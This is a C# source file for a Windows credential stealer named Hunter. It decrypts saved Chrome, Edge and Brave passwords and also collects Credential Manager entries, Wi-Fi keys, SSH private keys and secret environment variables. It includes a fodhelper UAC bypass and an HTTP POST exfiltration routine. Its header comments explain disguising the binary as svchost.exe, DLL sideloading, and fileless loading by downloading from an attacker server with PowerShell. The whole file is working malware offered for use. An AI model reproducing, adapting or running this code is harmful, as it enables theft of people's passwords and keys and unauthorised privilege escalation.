// Hunter.cs — Windows credential extractor (C# rewrite of ctf_hunter.py)
//
// Compile as EXE (requires .NET 6+):
//   csc -target:exe -out:svchost.exe Hunter.cs
//   dotnet build   (if using a .csproj)
//
// Compile as DLL for sideloading:
//   csc -target:library -out:VERSION.dll Hunter.cs
//   Then call Hunter.Run() from a proxy DLL or reflective loader.
//
// Reflective load via PowerShell (never touches disk as an exe):
//   $b = (iwr http://yourserver/Hunter.dll).Content
//   [Reflection.Assembly]::Load($b) | Out-Null
//   [Hunter.Collector]::Run("http://yourserver:8000")
//
// Usage as EXE:
//   Hunter.exe                                    # dump to stdout
//   Hunter.exe --exfil http://IP:8000             # POST zip to receiver
//   Hunter.exe --out C:\Temp\results.txt          # save to file
//   Hunter.exe --elevate --exfil http://IP:8000   # UAC bypass then run
//
// Targets:
//   Chrome / Edge passwords (DPAPI master key + AES-GCM decryption)
//   Windows Credential Manager (CredEnumerate)
//   Wi-Fi passwords (netsh)
//   Environment variables and PATH
//   SSH private keys

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Hunter
{
    // ── Native API declarations ─────────────────────────────────────────────────
    static class NativeMethods
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CredEnumerate(string filter, int flag, out int count, out IntPtr pCredentials);

        [DllImport("advapi32.dll")]
        public static extern void CredFree(IntPtr buffer);

        [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn, string szDataDescr, IntPtr pOptionalEntropy,
            IntPtr pvReserved, IntPtr pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LocalFree(IntPtr hMem);

        [DllImport("shell32.dll")]
        public static extern bool IsUserAnAdmin();

        [DllImport("shell32.dll", CharSet = CharSet.Unicode)]
        public static extern int ShellExecuteW(IntPtr hwnd, string lpOperation,
            string lpFile, string lpParameters, string lpDirectory, int nShowCmd);
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct CREDENTIAL
    {
        public int Flags, Type;
        public string TargetName, Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist, AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias, UserName;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct DATA_BLOB
    {
        public int cbData;
        public IntPtr pbData;
    }

    // ── DPAPI helper ────────────────────────────────────────────────────────────
    static class Dpapi
    {
        public static byte[] Decrypt(byte[] data)
        {
            var inBlob  = new DATA_BLOB { cbData = data.Length };
            var outBlob = new DATA_BLOB();
            inBlob.pbData = Marshal.AllocHGlobal(data.Length);
            try
            {
                Marshal.Copy(data, 0, inBlob.pbData, data.Length);
                if (!NativeMethods.CryptUnprotectData(ref inBlob, null, IntPtr.Zero,
                    IntPtr.Zero, IntPtr.Zero, 0, ref outBlob))
                    return null;
                var result = new byte[outBlob.cbData];
                Marshal.Copy(outBlob.pbData, result, 0, outBlob.cbData);
                NativeMethods.LocalFree(outBlob.pbData);
                return result;
            }
            finally { Marshal.FreeHGlobal(inBlob.pbData); }
        }
    }

    // ── Main collector ──────────────────────────────────────────────────────────
    public static class Collector
    {
        static readonly List<string> Findings = new();

        static void Add(string section, string value, string note = "")
        {
            var line = $"[{section}]  {value}" + (note != "" ? $"  ({note})" : "");
            Findings.Add(line);
            Console.WriteLine(line);
        }

        // ── Chrome / Edge ───────────────────────────────────────────────────────
        static void CollectBrowserPasswords()
        {
            var browsers = new Dictionary<string, string>
            {
                ["Chrome"] = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    @"Google\Chrome\User Data"),
                ["Edge"] = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    @"Microsoft\Edge\User Data"),
                ["Brave"] = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    @"BraveSoftware\Brave-Browser\User Data"),
            };

            foreach (var (name, userDataPath) in browsers)
            {
                var localStatePath = Path.Combine(userDataPath, "Local State");
                if (!File.Exists(localStatePath)) continue;

                byte[] masterKey = null;
                try
                {
                    var json = File.ReadAllText(localStatePath);
                    // Extract encrypted_key from JSON
                    var marker = "\"encrypted_key\":\"";
                    var idx = json.IndexOf(marker);
                    if (idx < 0) continue;
                    var start = idx + marker.Length;
                    var end = json.IndexOf('"', start);
                    var encKeyB64 = json.Substring(start, end - start);
                    var encKey = Convert.FromBase64String(encKeyB64);
                    // First 5 bytes are "DPAPI" prefix
                    var keyData = new byte[encKey.Length - 5];
                    Array.Copy(encKey, 5, keyData, 0, keyData.Length);
                    masterKey = Dpapi.Decrypt(keyData);
                }
                catch { continue; }

                if (masterKey == null) continue;

                // Find all profile Login Data databases
                var profiles = new List<string> { userDataPath };
                try
                {
                    foreach (var dir in Directory.GetDirectories(userDataPath, "Profile*"))
                        profiles.Add(dir);
                    var def = Path.Combine(userDataPath, "Default");
                    if (Directory.Exists(def)) profiles.Add(def);
                }
                catch { }

                foreach (var profile in profiles)
                {
                    var loginData = Path.Combine(profile, "Login Data");
                    if (!File.Exists(loginData)) continue;

                    // Copy to temp (original is locked by browser)
                    var tmp = Path.GetTempFileName();
                    try
                    {
                        File.Copy(loginData, tmp, overwrite: true);
                        ExtractSqlitePasswords(tmp, name, masterKey);
                    }
                    catch { }
                    finally
                    {
                        try { File.Delete(tmp); } catch { }
                    }
                }
            }
        }

        // Minimal SQLite reader — parses Chrome's Login Data for logins_v2 table
        static void ExtractSqlitePasswords(string dbPath, string browser, byte[] masterKey)
        {
            // We use SQLite via Chrome's own sqlite3.dll via dynamic P/Invoke
            // Fallback: parse the raw bytes looking for URL + username + encrypted_value pattern
            try
            {
                // Load Chrome's sqlite3.dll dynamically
                var chromePaths = new[]
                {
                    @"C:\Program Files\Google\Chrome\Application",
                    @"C:\Program Files (x86)\Google\Chrome\Application",
                    Path.Combine(Environment.GetFolderPath(
                        Environment.SpecialFolder.LocalApplicationData),
                        @"Google\Chrome\Application"),
                };
                string sqlite3Path = null;
                foreach (var p in chromePaths)
                {
                    if (!Directory.Exists(p)) continue;
                    foreach (var v in Directory.GetDirectories(p))
                    {
                        var candidate = Path.Combine(v, "sqlite3.dll");
                        if (File.Exists(candidate)) { sqlite3Path = candidate; break; }
                    }
                    if (sqlite3Path != null) break;
                }

                if (sqlite3Path != null)
                    ExtractViaChromeSqlite(dbPath, browser, masterKey, sqlite3Path);
                else
                    ExtractViaRawParse(dbPath, browser, masterKey);
            }
            catch { }
        }

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_open_delegate([MarshalAs(UnmanagedType.LPStr)] string filename, out IntPtr db);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate IntPtr sqlite3_errmsg_delegate(IntPtr db);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_prepare_v2_delegate(IntPtr db,
            [MarshalAs(UnmanagedType.LPStr)] string sql, int nByte, out IntPtr stmt, IntPtr pzTail);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_step_delegate(IntPtr stmt);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate IntPtr sqlite3_column_text_delegate(IntPtr stmt, int iCol);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate IntPtr sqlite3_column_blob_delegate(IntPtr stmt, int iCol);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_column_bytes_delegate(IntPtr stmt, int iCol);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_finalize_delegate(IntPtr stmt);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        delegate int sqlite3_close_delegate(IntPtr db);

        static void ExtractViaChromeSqlite(string dbPath, string browser, byte[] masterKey, string dllPath)
        {
            var lib = NativeLibrary.Load(dllPath);
            try
            {
                var open     = Marshal.GetDelegateForFunctionPointer<sqlite3_open_delegate>(NativeLibrary.GetExport(lib, "sqlite3_open"));
                var prep     = Marshal.GetDelegateForFunctionPointer<sqlite3_prepare_v2_delegate>(NativeLibrary.GetExport(lib, "sqlite3_prepare_v2"));
                var step     = Marshal.GetDelegateForFunctionPointer<sqlite3_step_delegate>(NativeLibrary.GetExport(lib, "sqlite3_step"));
                var colText  = Marshal.GetDelegateForFunctionPointer<sqlite3_column_text_delegate>(NativeLibrary.GetExport(lib, "sqlite3_column_text"));
                var colBlob  = Marshal.GetDelegateForFunctionPointer<sqlite3_column_blob_delegate>(NativeLibrary.GetExport(lib, "sqlite3_column_blob"));
                var colBytes = Marshal.GetDelegateForFunctionPointer<sqlite3_column_bytes_delegate>(NativeLibrary.GetExport(lib, "sqlite3_column_bytes"));
                var finalize = Marshal.GetDelegateForFunctionPointer<sqlite3_finalize_delegate>(NativeLibrary.GetExport(lib, "sqlite3_finalize"));
                var close    = Marshal.GetDelegateForFunctionPointer<sqlite3_close_delegate>(NativeLibrary.GetExport(lib, "sqlite3_close"));

                if (open(dbPath, out IntPtr db) != 0) return;
                try
                {
                    const string sql = "SELECT origin_url, username_value, password_value FROM logins";
                    if (prep(db, sql, -1, out IntPtr stmt, IntPtr.Zero) != 0) return;
                    try
                    {
                        while (step(stmt) == 100) // SQLITE_ROW
                        {
                            var url  = Marshal.PtrToStringAnsi(colText(stmt, 0));
                            var user = Marshal.PtrToStringAnsi(colText(stmt, 1));
                            var blobPtr   = colBlob(stmt, 2);
                            var blobLen   = colBytes(stmt, 2);
                            if (blobLen <= 0) continue;
                            var blob = new byte[blobLen];
                            Marshal.Copy(blobPtr, blob, 0, blobLen);
                            var pass = DecryptPassword(blob, masterKey);
                            if (!string.IsNullOrEmpty(pass))
                                Add(browser, $"{url}  |  user: {user}  |  pass: {pass}");
                        }
                    }
                    finally { finalize(stmt); }
                }
                finally { close(db); }
            }
            finally { NativeLibrary.Free(lib); }
        }

        static void ExtractViaRawParse(string dbPath, string browser, byte[] masterKey)
        {
            // Fallback: scan raw SQLite bytes for v10/v20 blobs near text data
            var data = File.ReadAllBytes(dbPath);
            var marker = Encoding.ASCII.GetBytes("v10");
            for (int i = 0; i < data.Length - 50; i++)
            {
                if (data[i] == 0x76 && data[i + 1] == 0x31 && data[i + 2] == 0x30)
                {
                    // heuristic: grab up to 256 bytes as potential encrypted blob
                    int len = Math.Min(256, data.Length - i);
                    var blob = new byte[len];
                    Array.Copy(data, i, blob, 0, len);
                    var pass = DecryptPassword(blob, masterKey);
                    if (!string.IsNullOrEmpty(pass))
                        Add(browser, $"[raw-parse] {pass}");
                }
            }
        }

        static string DecryptPassword(byte[] blob, byte[] masterKey)
        {
            try
            {
                // v10/v20 format: 3-byte prefix + 12-byte nonce + ciphertext + 16-byte tag
                if (blob.Length < 31) return null;
                var prefix = Encoding.ASCII.GetString(blob, 0, 3);
                if (prefix == "v10" || prefix == "v20")
                {
                    var nonce = new byte[12];
                    Array.Copy(blob, 3, nonce, 0, 12);
                    var ciphertextWithTag = new byte[blob.Length - 15];
                    Array.Copy(blob, 15, ciphertextWithTag, 0, ciphertextWithTag.Length);

                    var ciphertext = new byte[ciphertextWithTag.Length - 16];
                    var tag = new byte[16];
                    Array.Copy(ciphertextWithTag, ciphertext, ciphertext.Length);
                    Array.Copy(ciphertextWithTag, ciphertext.Length, tag, 0, 16);

                    var plaintext = new byte[ciphertext.Length];
                    using var aes = new AesGcm(masterKey, 16);
                    aes.Decrypt(nonce, ciphertext, tag, plaintext);
                    return Encoding.UTF8.GetString(plaintext);
                }
                else
                {
                    // Old DPAPI-only format
                    var dec = Dpapi.Decrypt(blob);
                    return dec != null ? Encoding.UTF8.GetString(dec) : null;
                }
            }
            catch { return null; }
        }

        // ── Windows Credential Manager ──────────────────────────────────────────
        static void CollectCredentialManager()
        {
            try
            {
                if (!NativeMethods.CredEnumerate(null, 0, out int count, out IntPtr pCreds))
                    return;

                var size = Marshal.SizeOf<CREDENTIAL>();
                for (int i = 0; i < count; i++)
                {
                    var pCred = Marshal.ReadIntPtr(pCreds, i * IntPtr.Size);
                    var cred  = Marshal.PtrToStructure<CREDENTIAL>(pCred);
                    if (cred.CredentialBlobSize <= 0) continue;
                    var blobData = new byte[cred.CredentialBlobSize];
                    Marshal.Copy(cred.CredentialBlob, blobData, 0, cred.CredentialBlobSize);
                    var pass = Encoding.Unicode.GetString(blobData);
                    Add("CredMan", $"Target: {cred.TargetName}  |  User: {cred.UserName}  |  Pass: {pass}");
                }
                NativeMethods.CredFree(pCreds);
            }
            catch { }
        }

        // ── Wi-Fi passwords ─────────────────────────────────────────────────────
        static void CollectWifi()
        {
            try
            {
                var profiles = RunCmd("netsh wlan show profiles");
                foreach (var line in profiles.Split('\n'))
                {
                    var trimmed = line.Trim();
                    if (!trimmed.Contains(":")) continue;
                    var parts = trimmed.Split(':');
                    if (parts.Length < 2) continue;
                    var ssid = parts[parts.Length - 1].Trim();
                    if (string.IsNullOrEmpty(ssid)) continue;

                    var detail = RunCmd($"netsh wlan show profile \"{ssid}\" key=clear");
                    foreach (var dline in detail.Split('\n'))
                    {
                        if (dline.Contains("Key Content"))
                        {
                            var keyParts = dline.Split(':');
                            if (keyParts.Length >= 2)
                                Add("WiFi", $"SSID: {ssid}  |  Key: {keyParts[keyParts.Length - 1].Trim()}");
                        }
                    }
                }
            }
            catch { }
        }

        // ── SSH keys ────────────────────────────────────────────────────────────
        static void CollectSshKeys()
        {
            var sshDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".ssh");
            if (!Directory.Exists(sshDir)) return;
            foreach (var f in Directory.GetFiles(sshDir))
            {
                try
                {
                    var content = File.ReadAllText(f);
                    if (content.Contains("PRIVATE KEY"))
                        Add("SSHKey", $"File: {f}\n{content.Substring(0, Math.Min(200, content.Length))}");
                }
                catch { }
            }
        }

        // ── Environment secrets ─────────────────────────────────────────────────
        static void CollectEnv()
        {
            var keywords = new[] { "PASS", "TOKEN", "SECRET", "KEY", "API", "AWS", "AZURE", "AUTH" };
            foreach (System.Collections.DictionaryEntry e in System.Environment.GetEnvironmentVariables())
            {
                var k = e.Key.ToString().ToUpperInvariant();
                foreach (var kw in keywords)
                {
                    if (k.Contains(kw))
                    {
                        Add("EnvSecret", $"{e.Key}={e.Value}");
                        break;
                    }
                }
            }
        }

        // ── UAC bypass (fodhelper) ──────────────────────────────────────────────
        static void ElevateAndRerun(string[] args)
        {
            if (NativeMethods.IsUserAnAdmin()) return; // already elevated

            var exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            var newArgs = string.Join(" ", args).Replace("--elevate", "").Trim();

            try
            {
                // Write registry keys for fodhelper bypass
                var regKey = @"Software\Classes\ms-settings\shell\open\command";
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regKey)
                    .SetValue("", $"\"{exePath}\" {newArgs}");
                Microsoft.Win32.Registry.CurrentUser.CreateSubKey(regKey)
                    .SetValue("DelegateExecute", "");

                // Trigger fodhelper
                var p = System.Diagnostics.Process.Start(
                    new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = "fodhelper.exe",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    });
                p?.WaitForExit(3000);
            }
            finally
            {
                // Always clean up the registry key
                try
                {
                    Microsoft.Win32.Registry.CurrentUser
                        .DeleteSubKeyTree(@"Software\Classes\ms-settings", false);
                }
                catch { }
            }
            Environment.Exit(0);
        }

        // ── Exfiltration ────────────────────────────────────────────────────────
        static async Task ExfilHttp(string url)
        {
            var body = string.Join("\n", Findings);
            var content = new StringContent(body, Encoding.UTF8, "text/plain");
            var hostname = Environment.MachineName;
            using var client = new HttpClient();
            client.DefaultRequestHeaders.Add("X-Host", hostname);
            await client.PostAsync(url, content);
        }

        // ── Helpers ─────────────────────────────────────────────────────────────
        static string RunCmd(string cmd)
        {
            try
            {
                var p = System.Diagnostics.Process.Start(
                    new System.Diagnostics.ProcessStartInfo("cmd.exe", "/C " + cmd)
                    {
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        UseShellExecute = false,
                        CreateNoWindow = true,
                    });
                var output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                p.WaitForExit();
                return output;
            }
            catch { return ""; }
        }

        // ── Public entry point ──────────────────────────────────────────────────
        public static void Run(string exfilUrl = null)
        {
            Console.WriteLine("[*] Collecting credentials ...\n");

            CollectBrowserPasswords();
            CollectCredentialManager();
            CollectWifi();
            CollectSshKeys();
            CollectEnv();

            Console.WriteLine($"\n[*] Total findings: {Findings.Count}");

            if (exfilUrl != null)
            {
                Console.WriteLine($"[*] Exfiltrating to {exfilUrl} ...");
                ExfilHttp(exfilUrl).GetAwaiter().GetResult();
                Console.WriteLine("[+] Done");
            }
        }

        // ── CLI entry point ─────────────────────────────────────────────────────
        static void Main(string[] args)
        {
            string exfilUrl = null;
            string outFile = null;
            bool elevate = false;

            for (int i = 0; i < args.Length; i++)
            {
                switch (args[i])
                {
                    case "--exfil":   if (i + 1 < args.Length) exfilUrl = args[++i]; break;
                    case "--out":     if (i + 1 < args.Length) outFile  = args[++i]; break;
                    case "--elevate": elevate = true; break;
                }
            }

            if (elevate) ElevateAndRerun(args);

            Run(exfilUrl);

            if (outFile != null)
            {
                File.WriteAllLines(outFile, Findings);
                Console.WriteLine($"[+] Saved to {outFile}");
            }
        }
    }
}
